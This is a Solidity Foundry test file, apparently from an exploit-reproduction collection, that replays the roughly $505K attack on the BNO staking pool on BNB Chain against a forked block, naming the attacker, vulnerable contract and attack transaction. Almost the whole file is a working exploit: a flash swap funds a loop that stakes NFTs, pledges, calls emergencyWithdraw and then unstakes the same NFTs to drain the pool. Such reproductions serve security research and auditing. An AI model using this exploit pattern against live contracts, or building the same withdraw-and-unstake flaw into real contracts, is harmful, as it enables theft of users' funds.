// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$505K
// Attacker : https://bscscan.com/address/0xa6566574edc60d7b2adbacedb71d5142cf2677fb
// Attacker Contract : https://bscscan.com/address/0xd138b9a58d3e5f4be1cd5ec90b66310e241c13cd
// Vulnerable Contract : https://bscscan.com/address/0xdca503449899d5649d32175a255a8835a03e4006
// Attack Tx : https://bscscan.com/tx/0x33fed54de490797b99b2fc7a159e43af57e9e6bdefc2c2d052dc814cfe0096b9

// @Analysis
// https://twitter.com/BeosinAlert/status/1681116206663876610

interface IPool {
    function emergencyWithdraw() external;

    function stakeNft(uint256[] memory tokenIds) external payable;

    function unstakeNft(uint256[] memory tokenIds) external payable;

    function pledge(uint256 _stakeAmount) external payable;
}

contract BNOTest is Test {
    IERC721 NFT = IERC721(0x8EE0C2709a34E9FDa43f2bD5179FA4c112bEd89A);
    IERC20 BNO = IERC20(0xa4dBc813F7E1bf5827859e278594B1E0Ec1F710F);
    IPancakePair PancakePair = IPancakePair(0x4B9c234779A3332b74DBaFf57559EC5b4cB078BD);
    IPool Pool = IPool(0xdCA503449899d5649D32175a255A8835A03E4006);
    address private constant attacker = 0xA6566574eDC60D7B2AdbacEdB71D5142cf2677fB;
    address private constant attackerContract = 0xD138b9a58D3e5f4be1CD5eC90B66310e241C13CD;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30_056_629);
        cheats.label(address(NFT), "NFT");
        cheats.label(address(BNO), "BNO");
        cheats.label(address(PancakePair), "PancakePair");
        cheats.label(address(Pool), "Pool");
        cheats.label(attacker, "Attacker");
        cheats.label(attackerContract, "Attacker Contract");
    }

    function testExploit() public {
        cheats.startPrank(attackerContract);
        NFT.transferFrom(attacker, address(this), 13);
        NFT.transferFrom(attacker, address(this), 14);
        cheats.stopPrank();

        emit log_named_decimal_uint(
            "Attacker balance of BNO before exploit", BNO.balanceOf(address(this)), BNO.decimals()
        );
        PancakePair.swap(0, BNO.balanceOf(address(PancakePair)) - 1, address(this), hex"00");
        emit log_named_decimal_uint(
            "Attacker balance of BNO after exploit", BNO.balanceOf(address(this)), BNO.decimals()
        );
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        BNO.approve(address(Pool), type(uint256).max);
        for (uint256 i; i < 100; i++) {
            callEmergencyWithdraw();
        }
        BNO.transfer(address(PancakePair), 296_077 * 1e18);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function callEmergencyWithdraw() internal {
        NFT.approve(address(Pool), 13);
        NFT.approve(address(Pool), 14);

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 13;
        tokenIds[1] = 14;
        Pool.stakeNft{value: 0.008 ether}(tokenIds);
        Pool.pledge{value: 0.008 ether}(BNO.balanceOf(address(this)));
        // Emergency withdraw is made without withdrawing the staked NFTs
        Pool.emergencyWithdraw();
        // Stake is canceled but NFTs are still claimable
        Pool.unstakeNft{value: 0.008 ether}(tokenIds);
    }
}
